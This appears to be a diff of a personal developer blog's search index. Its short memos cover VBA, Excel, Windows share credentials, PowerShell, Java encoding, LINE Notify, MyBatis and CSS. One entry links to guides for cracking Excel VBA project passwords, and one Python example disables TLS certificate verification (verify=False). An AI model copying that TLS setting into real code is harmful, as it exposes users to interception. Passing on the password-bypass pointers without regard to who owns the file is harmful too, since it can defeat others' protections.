href="http://www.bolterauer.de/consulting/dev/vbatools/vba_logging/VBALogging.html#Downloadsourcefiles">Logging for VBA - <strong>official site</strong></a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> excel </category>
+          
+          <category> vba </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vba </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Share folder can&#39;t access after ad password changed</title>
+      <link href="/2022/03/10/2022-2022-03-10-share-folder-connect-problem/"/>
+      <url>/2022/03/10/2022-2022-03-10-share-folder-connect-problem/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Story-4">Story</h2><p>This occur I enter remote windows server using local account and share folder using ad account.After I change ad password then I can’t access share forder.This article will tell u how to solve it.</p><h2 id="cause-and-solve">cause and solve</h2><blockquote><p>Network table keep your previous connection information ,so u can use command <strong>net use /delete</strong>.It will clear connection info.<br>You reaccess share folder will show Window Security window and enter account/new password.</p></blockquote><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">net use</span></span><br><span class="line"></span><br><span class="line">Status        Local       Remote                 Network</span><br><span class="line">--------------------------------------------------------------------------</span><br><span class="line">ok                        \\tp123\IPC$    Microsoft Windows Network</span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">&gt; </span><span class="language-bash">net use * /delete</span> </span><br></pre></td></tr></table></figure><hr><h2 id="reference-14">reference</h2><ul><li><a href="https://stackoverflow.com/questions/54898305/how-to-restore-access-to-a-windows-shared-folder-after-host-password-change">How to restore access to a windows shared folder after host password change? - stackoverflow ozzylee</a></li><li><a href="https://serverfault.com/questions/451387/how-to-delete-cached-temporarily-credentials-for-a-network-share-on-a-windows-ma">How to delete cached temporarily credentials for a network share on a Windows machine without rebooting or logging off - serverfault</a></li><li><a href="http://woshub.com/saved-passwords-windows-credential-manager/">Windows Credential Manager - Window OSHub</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> windows </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> windows </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Chinese encoding issue</title>
+      <link href="/2022/03/09/2022-2022-03-09-chinese-encoding-issue/"/>
+      <url>/2022/03/09/2022-2022-03-09-chinese-encoding-issue/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Summary-3">Summary</h2><p>This article tell u how to simulate string write to db that come from some application.You will know how it works</p><h2 id="Preliminary-knowledge">Preliminary knowledge</h2><ul><li><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/String.html#getBytes-java.lang.String-">getBytes - API</a></li></ul><blockquote><p><strong>Encodes</strong> this String into a sequence of bytes using the named charset,storing the result into a new byte array.</p></blockquote><ul><li><a href="https://docs.oracle.com/javase/8/docs/api/java/lang/String.html#String-byte:A-java.lang.String-">String - API</a></li></ul><blockquote><p>Constructs a new String by <strong>decoding</strong> the specified array of bytes using the specified charset.</p></blockquote><h2 id="Demo">Demo</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="comment">// simulate a db charset UTF-8</span></span><br><span class="line">    System.setOut(<span class="keyword">new</span> <span class="title class_">PrintStream</span>(<span class="keyword">new</span> <span class="title class_">File</span>(<span class="string">&quot;a.txt&quot;</span>), <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// your edit is UTF-8，complie using UTF-8</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;測試&quot;</span>;</span><br><span class="line">    <span class="type">byte</span>[] bs = s.getBytes(<span class="string">&quot;UTF-8&quot;</span>); <span class="comment">//encoding to &#123;e6,b8,ac,e8,a9,a6&#125; </span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// for (int i = 0 ;i&lt;bs.length;i++) &#123;</span></span><br><span class="line">    <span class="comment">//     System.out.println(Integer.toHexString(bs[i]));</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// simulate get response parameter using big5</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">param</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(bs, <span class="string">&quot;Big5&quot;</span>);<span class="comment">// decoding bs array using Big5.You can use visit Query BIG-5 Code website using bs array,and will get 皜祈岫 decoding(e6 b8 ac e8 a9 a6)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// simulate write to db</span></span><br><span class="line">    System.out.println(param);<span class="comment">//param be encoded using UTF-8 in the txt file and will see 皜祈岫 encoding utf8(e7 9a 9c e7 a5 88 e5 b2 ab)</span></span><br><span class="line">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="encoding-and-decoding">encoding and decoding</h2><p><img src="../../assets/img/blog/20220309/encoding.jpg" alt=""></p><hr><h2 id="reference-13">reference</h2><ul><li><a href="https://ace33022.github.io/big5code/">Query BIG-5 Code - <strong>ace33022</strong></a></li><li><a href="http://www.mytju.com/classcode/tools/encode_utf8.asp">Query UTF-8 Code - <strong>心缘地方</strong></a></li><li><a href="https://www.javaworld.com.tw/jute/post/view?bid=21&amp;id=282136&amp;tpg=1&amp;ppg=1&amp;sty=1&amp;age=0#282136">如果在資料庫中原始資料就已經是亂碼的話 還有救嗎? - <strong>JWorld@TW</strong></a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> encoding </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> encoding </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>How to fix excel formula auto-calculate</title>
+      <link href="/2022/03/04/2022-2022-03-04-excel-auto-calculate/"/>
+      <url>/2022/03/04/2022-2022-03-04-excel-auto-calculate/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Story-3">Story</h2><p>Excel third-party addin help us to solve complicated numeric problem.Sometimes all cells refresh by add-in but some cells need to using f2 + Enter to enforce it refresh.This article tell u two way to solve it.</p><h2 id="solution-2">solution</h2><h3 id="vba">vba</h3><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Selection.Value = Selection.FormulaR1C1</span><br></pre></td></tr></table></figure><h3 id="function">function</h3><ul><li>u can this cell function add now function</li></ul><blockquote><p>f() + now()*0</p></blockquote><hr><h2 id="reference-12">reference</h2><ul><li><a href="https://stackoverflow.com/questions/24060831/force-f2enter-on-range-of-cells">Force “F2”+“Enter” on range of cells - <strong>stackoverflow Thomas F.</strong> </a></li><li><a href="https://www.excelcampus.com/functions/formulas-not-calculating/">How to Fix Excel Formulas that are Not Calculating or Updating - <strong>EXCEL Campus</strong></a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> excel </category>
+          
+          <category> function </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vba </tag>
+            
+            <tag> excel </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>How to get details about a process in windows</title>
+      <link href="/2022/03/01/2022-2022-02-25-Get-detail-about-a-process-in-windows/"/>
+      <url>/2022/03/01/2022-2022-02-25-Get-detail-about-a-process-in-windows/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Stroy">Stroy</h2><p>Memo how to get details about process</p><h2 id=""></h2><ol><li>open task manager</li><li>select tab detail</li><li>get pid that you want for example 15544</li><li>enter win</li><li>type power shell</li><li><strong>get how long a process runs type below</strong></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">New-TimeSpan(Get-Process -Id 15544).StartTime</span><br></pre></td></tr></table></figure><ol start="8"><li>get information</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Days              : 0</span><br><span class="line">Hours             : 1</span><br><span class="line">Minutes           : 28</span><br><span class="line">Seconds           : 38</span><br><span class="line">Milliseconds      : 505</span><br><span class="line">Ticks             : 53185054760</span><br><span class="line">TotalDays         : 0.0615567763425926</span><br><span class="line">TotalHours        : 1.47736263222222</span><br><span class="line">TotalMinutes      : 88.6417579333333</span><br><span class="line">TotalSeconds      : 5318.505476</span><br><span class="line">TotalMilliseconds : 5318505.476</span><br></pre></td></tr></table></figure><ol start="9"><li><strong>get process start time</strong></li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-Process -Id 15544 | select StartTime</span><br></pre></td></tr></table></figure><p>10.get info</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">StartTime</span><br><span class="line">---------</span><br><span class="line">2022/3/1 上午 08:29:39</span><br></pre></td></tr></table></figure><hr><h2 id="reference-10">reference</h2><ul><li><a href="https://webcache.googleusercontent.com/search?q=cache:ufcr0d_MvNQJ:https://devblogs.microsoft.com/scripting/powertip-use-powershell-to-easily-find-how-long-a-process-runs/+&amp;cd=14&amp;hl=zh-TW&amp;ct=clnk&amp;gl=tw">Use PowerShell to Easily Find How Long a Process Runs - <strong>Microsoft</strong></a></li><li><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-process?view=powershell-7.2">Get-Process - <strong>Microsoft doc</strong></a></li><li><a href="https://stackoverflow.com/questions/34142041/how-to-get-the-process-start-time-in-powershell">How to get the process start time in PowerShell - <strong>Stack overflow (gwtharg)</strong></a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> windows </category>
+          
+          <category> power shell </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> power shell </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Line notify with Apps script</title>
+      <link href="/2022/02/28/2022-2022-02-28-line-notify-with-apps-script/"/>
+      <url>/2022/02/28/2022-2022-02-28-line-notify-with-apps-script/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Summary-2">Summary</h2><p>This article will teach u how to crate a apps script application.<br>This application will send message to your line using line notify service.</p><h2 id="line-notify">line notify</h2><h3 id="create-line-notify-token">create line notify token</h3><ol><li>login in line notify</li><li>click right coner select box and choose person page</li><li>scroll down the page and publish token</li><li>enter your own token name</li><li>choose u whant group  name and click publish</li><li>copy token and save to other place</li></ol><h2 id="apps-script">apps script</h2><h3 id="create-app-script-application">create app script application</h3><ol><li>login in google</li><li>enter <a href="https://script.google.com/home">https://script.google.com/home</a></li><li>click left coner plus sign to create new project</li><li>naming your project name</li><li>coding <figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">doPost</span>(<span class="params">e</span>) &#123;</span><br><span class="line"><span class="keyword">var</span> token = <span class="string">&#x27;xxxxxxx&#x27;</span>;</span><br><span class="line"><span class="keyword">var</span> param = e.<span class="property">parameter</span>;</span><br><span class="line"><span class="keyword">var</span> msg = param.<span class="property">msg</span>;</span><br><span class="line"></span><br><span class="line"><span class="title class_">UrlFetchApp</span>.<span class="title function_">fetch</span>(<span class="string">&#x27;https://notify-api.line.me/api/notify&#x27;</span>, &#123;</span><br><span class="line">        <span class="string">&#x27;headers&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;Authorization&#x27;</span>: <span class="string">&#x27;Bearer &#x27;</span> + token,</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&#x27;method&#x27;</span>: <span class="string">&#x27;post&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;payload&#x27;</span>: &#123;</span><br><span class="line">            <span class="string">&#x27;message&#x27;</span>:msg</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>click right coner deploy icon</li><li>choose new deploy</li><li>add description…and deploy</li><li>Authorize…and allow</li><li>copy your application url</li></ol><h2 id="Testing">Testing</h2><h3 id="Using-js">Using js</h3><ol><li>open chrome console</li><li>load jquery<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> jqry = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">jqry.<span class="property">src</span> = <span class="string">&quot;https://code.jquery.com/jquery-3.3.1.min.js&quot;</span>;</span><br><span class="line"><span class="variable language_">document</span>.<span class="title function_">getElementsByTagName</span>(<span class="string">&#x27;head&#x27;</span>)[<span class="number">0</span>].<span class="title function_">appendChild</span>(jqry);</span><br><span class="line">jQuery.<span class="title function_">noConflict</span>();</span><br></pre></td></tr></table></figure></li><li>test code<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$.<span class="title function_">post</span>(<span class="string">&#x27;your application url&#x27;</span>,</span><br><span class="line"> &#123;<span class="attr">msg</span>:<span class="string">&#x27;hello world&#x27;</span>&#125;,</span><br><span class="line"> <span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">     <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line"> &#125;);</span><br></pre></td></tr></table></figure></li><li>get message on line app</li></ol><h3 id="Using-python">Using python</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;your application url&#x27;</span></span><br><span class="line">mydata = &#123;<span class="string">&#x27;msg&#x27;</span> : msg&#125;</span><br><span class="line"></span><br><span class="line">request.post(url,data=mydata,verify =<span class="literal">False</span>)</span><br></pre></td></tr></table></figure><hr><h2 id="reference-11">reference</h2><ul><li><a href="https://doobom.me/run-jquery-in-chrome-console">Run jQuery in Chrome Console - doobom’s blog</a></li><li><a href="https://www.oxxostudio.tw/articles/201806/line-notify.html">自建 LINE Notify 訊息通知 - oxxostudio blog</a></li><li><a href="https://script.google.com">Apps Script</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> line </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> line notify </tag>
+            
+            <tag> apps script </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Github Notebook</title>
+      <link href="/2022/02/25/2022-2022-02-26-github/"/>
+      <url>/2022/02/25/2022-2022-02-26-github/</url>
+      
+        <content type="html"><![CDATA[<h2 id="How-to-create-a-new-branch">How to create a new branch</h2><p><img src="/assets/img/blog/github/createBranch.gif" alt="how to create new branch"></p><h2 id="How-to-delete-a-branch">How to delete a branch</h2><p><img src="/assets/img/blog/github/deleteBranch.gif" alt="How to delete a branch"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> version control </category>
+          
+          <category> github </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> github </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>How to crack vba password</title>
+      <link href="/2022/02/15/2022-2022-02-15-FirstPost/"/>
+      <url>/2022/02/15/2022-2022-02-15-FirstPost/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Summary">Summary</h2><p>Memo how to crack vba password</p><h2 id="Crack-vba-password">Crack vba password</h2><ul><li><a href="https://www.monspy.com/crack-excel-vba-password/">https://www.monspy.com/crack-excel-vba-password/</a></li><li><a href="http://gary-li.blogspot.com/2018/07/excel.html">http://gary-li.blogspot.com/2018/07/excel.html</a></li><li><a href="https://stackoverflow.com/questions/1026483/is-there-a-way-to-crack-the-password-on-an-excel-vba-project">stackoverflow solution</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> excel </category>
+          
+          <category> vba </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> vba </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Test Web Service using Java</title>
+      <link href="/2021/12/12/2021-2021-12-12-java-webservice-client-test/"/>
+      <url>/2021/12/12/2021-2021-12-12-java-webservice-client-test/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Story-2">Story</h2><p>Something we using postman as testing webservice tool.This article provide another way to test.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args [])</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">    <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://127.0.0.1:8080/SYS/rest/twseInfo&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">HttpURLConnection</span> <span class="variable">http</span> <span class="operator">=</span> (HttpURLConnection)url.openConnection();</span><br><span class="line">    http.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">    http.setDoOutput(<span class="literal">true</span>);</span><br><span class="line">    http.setRequestProperty(<span class="string">&quot;Accept&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">    http.setRequestProperty(<span class="string">&quot;Content-Type&quot;</span>, <span class="string">&quot;application/json&quot;</span>);</span><br><span class="line">    <span class="comment">//jsono data</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;Info\&quot;:[&#123;\&quot;dataDate\&quot;:\&quot;2021/12/08\&quot;,\&quot;secCode\&quot;:\&quot;1101\&quot;,\&quot;secName\&quot;:\&quot;AAAA\&quot;,\&quot;paidInCapital\&quot;:63235800100,\&quot;outstandingShares\&quot;:6123580010,\&quot;pefundCommon\&quot;:0,\&quot;preferredStock\&quot;:200000000,\&quot;mospType\&quot;:\&quot;TWSE\&quot;,\&quot;createUser\&quot;:\&quot;RPA Robot\&quot;,\&quot;createDate\&quot;:\&quot;2021-12-02 10:30:35\&quot;,\&quot;procUser\&quot;:\&quot;RPA Robot\&quot;,\&quot;procDate\&quot;:\&quot;2021-12-02 10:30:35\&quot;&#125;,&#123;\&quot;dataDate\&quot;:\&quot;2021/12/08\&quot;,\&quot;secCode\&quot;:\&quot;1102\&quot;,\&quot;secName\&quot;:\&quot;BBBBB\&quot;,\&quot;paidInCapital\&quot;:63235800100,\&quot;outstandingShares\&quot;:6123580010,\&quot;pefundCommon\&quot;:0,\&quot;preferredStock\&quot;:200000000,\&quot;mospType\&quot;:\&quot;TWSE\&quot;,\&quot;createUser\&quot;:\&quot;RPA Robot\&quot;,\&quot;createDate\&quot;:\&quot;2021-12-02 10:30:35\&quot;,\&quot;procUser\&quot;:\&quot;RPA Robot\&quot;,\&quot;procDate\&quot;:\&quot;2021-12-02 10:30:35\&quot;&#125;]&#125;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] out = data.getBytes(StandardCharsets.UTF_8);</span><br><span class="line"></span><br><span class="line">    <span class="type">OutputStream</span> <span class="variable">stream</span> <span class="operator">=</span> http.getOutputStream();</span><br><span class="line">    stream.write(out);</span><br><span class="line"></span><br><span class="line">    System.out.println(http.getResponseCode() + <span class="string">&quot; &quot;</span> + http.getResponseMessage());</span><br><span class="line">    http.disconnect();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
+      
+      
+      <categories>
+          
+          <category> Java </category>
+          
+          <category> webservice </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> Java </tag>
+            
+            <tag> webservice </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>How to solve mybatis batch insert to sqlserver losing precision</title>
+      <link href="/2021/10/27/2021-2021-10-27-mybatis-sqlserver-batch-insert-loss-precision/"/>
+      <url>/2021/10/27/2021-2021-10-27-mybatis-sqlserver-batch-insert-loss-precision/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Story">Story</h2><p>使用mybatia寫入sqlserver db時的問題，當xml檔採用foreach的方式進行批量寫入時，BigDecimal的變數會因每筆寫入的精度不一致而採最低的精度寫入到db中</p><h2 id="solve">solve</h2><h3 id="cast">cast</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">insert</span> <span class="attr">id</span>=<span class="string">&quot;insertList&quot;</span> &gt;</span></span><br><span class="line">  insert into salary_list (id, user_id, type,base_salary)</span><br><span class="line">  VALUES</span><br><span class="line">  <span class="tag">&lt;<span class="name">foreach</span> <span class="attr">collection</span>=<span class="string">&quot;list&quot;</span> <span class="attr">item</span>=<span class="string">&quot;item&quot;</span> <span class="attr">index</span>=<span class="string">&quot;index&quot;</span> <span class="attr">separator</span> =<span class="string">&quot;,&quot;</span>&gt;</span></span><br><span class="line">    (</span><br><span class="line">        #&#123;item.id,jdbcType=BIGINT&#125;,</span><br><span class="line">        #&#123;item.userId,jdbcType=BIGINT&#125;,</span><br><span class="line">        #&#123;item.type,jdbcType=INTEGER&#125;,</span><br><span class="line">        cast(#&#123;item.baseSalary,jdbcType=DECIMAL&#125; as decimal(18,2))</span><br><span class="line">    )</span><br><span class="line">  <span class="tag">&lt;/<span class="name">foreach</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">insert</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="using-sqljdbc4-driver">using sqljdbc4 driver</h3><p>筆者嘗試使用此方式，但未成功。</p><hr><h2 id="reference-9">reference</h2><ul><li><a href="http://39.100.145.25/blog/detail/79654906433">mybatis批量插入bigDecimal数据丢失精度问题</a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> Java </category>
+          
+          <category> Mybatis </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> mybatis </tag>
+            
+            <tag> sqlserver </tag>
+            
+            <tag> BigDecimal </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CSS Block and Inline and Inine-block屬性研究</title>
+      <link href="/2021/07/31/2021-2021-07-31-css-block-and-inlineblock/"/>
+      <url>/2021/07/31/2021-2021-07-31-css-block-and-inlineblock/</url>
+      
+        <content type="html"><![CDATA[<h2 id="Preface">Preface</h2><blockquote><p>在HTML的element中都有一個預設的display屬性，有的是Inline，有的是Block，可以用它來達到我們想要的排版</p></blockquote><h2 id="Block">Block</h2><ul><li>會開始新的一行</li><li>block的element會佔滿畫面寬度(根據他的container)</li><li>可以設定長寬、margin、padding</li><li>水平與垂直寬度長度由內容決定</li></ul><h2 id="Inline">Inline</h2><ul><li>不可設定寬、高</li><li>只會佔只會占用它所必需的寬度，所以inline的element可以在同一行</li><li>top and bottom margin/padding沒有作用</li></ul><h2 id="Inline-block">Inline-block</h2><ul><li>可以水平排列</li><li>可設定寬高</li><li>block是相黏再一起，inline-block則不會，請參考W3C</li></ul><hr><h2 id="reference-5">reference</h2><ul><li><a href="https://ytclion.medium.com/css%E6%95%99%E5%AD%B8-%E9%97%9C%E6%96%BCdisplay-inline-inline-block-block%E7%9A%84%E5%B7%AE%E5%88%A5-1034f38eda82">CSS教學-關於display:inline、block、inline-block的差別 - <strong>YTCLion</strong></a></li><li><a href="https://www.w3schools.com/html/html_blocks.asp">HTML Block and Inline Elements - <strong>W3C</strong></a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Block-level_elements">Block-level elements - <strong>MDN</strong></a></li><li><a href="https://developer.mozilla.org/en-US/docs/Web/HTML/Inline_elements#inline_vs._block-level_elements_a_demonstration">Inline elements - <strong>MDN</strong></a></li><li><a href="https://www.w3schools.com/css/css_inline-block.asp">CSS Layout - display: inline-block - <strong>W3C</strong></a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> FrontEnd </category>
+          
+          <category> CSS </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CSS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CSS position屬性研究</title>
+      <link href="/2021/07/31/2021-2021-07-31-css-position/"/>
+      <url>/2021/07/31/2021-2021-07-31-css-position/</url>
+      
+        <content type="html"><![CDATA[<h2 id="定義-2">定義</h2><blockquote><p>用來指定element的定位方式</p></blockquote><ul><li><p>static(default)</p><blockquote><p><a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Introduction#normal_flow">normal flow</a>，top,bottom,left and right properties no effect.</p></blockquote></li><li><p>relative：</p><blockquote><p>moving it relative to its position in normal flow</p></blockquote></li><li><p>fixed</p><blockquote><p>it fixes an element relative to the browser viewport.</p></blockquote></li><li><p>absolute</p><blockquote><p>moves an element completely out of the page’s normal layout flow ,like it is setting on its own separte layer. it is positioned relative to the nearest positioned ancestor(instead of position relative to the viewport,like fixed)</p></blockquote><p>note：A positioned element is one whose position is anything except <strong>static</strong>.</p></li><li><p>sticky<br>　makes an element act like static until it hits a defined offset from the viewport,at which point it acts like position：fixed.</p></li></ul><hr><h2 id="reference-8">reference</h2><ul><li><p><a href="https://www.w3schools.com/css/css_positioning.asp">The position Property - <strong>W3C</strong></a></p></li><li><p><a href="https://developer.mozilla.org/en-US/docs/Learn/CSS/CSS_layout/Introduction#positioning_techniques">Position techniques - <strong>MDN</strong></a></p></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> FrontEnd </category>
+          
+          <category> CSS </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CSS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>CSS overflow屬性研究</title>
+      <link href="/2021/07/31/2021-2021-07-31-css-overflow/"/>
+      <url>/2021/07/31/2021-2021-07-31-css-overflow/</url>
+      
+        <content type="html"><![CDATA[<h2 id="定義">定義</h2><blockquote><p>CSS Overflow porperty是用來控制當內容太多無法放入該區域時該如何處理的property</p></blockquote><ul><li>visible：不管容器了顯示就對了</li><li>hidden：太多的隱藏</li><li>scroll：來個捲軸吧</li><li>auto：自動判斷，太多的時候就會有捲軸</li></ul><h2 id="Note">Note</h2><blockquote><p>只適用在block element有特定高度的情況下</p></blockquote><hr><h2 id="reference-6">reference</h2><ul><li><a href="https://www.w3schools.com/css/css_overflow.asp">CSS Overflow - <strong>W3C</strong></a></li></ul><hr><h2 id="reference-7">reference</h2><ul><li><a href="https://stackoverflow.com/questions/1878264/how-do-i-make-an-html-button-not-reload-the-page">How do I make an HTML button not reload the page - <strong>stack overflow</strong></a></li><li><a href="https://www.w3schools.com/tags/att_button_type.asp">HTML &lt;button&gt; type Attribute - <strong>w3c school</strong></a></li></ul>]]></content>
+      
+      
+      <categories>
+          
+          <category> FrontEnd </category>
+          
+          <category> CSS </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> CSS </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>What is RPA</title>
+      <link href="/2021/07/24/2021-2021-07-24-what-is-rpa/"/>
+      <url>/2021/07/24/2021-2021-07-24-what-is-rpa/</url>
+      
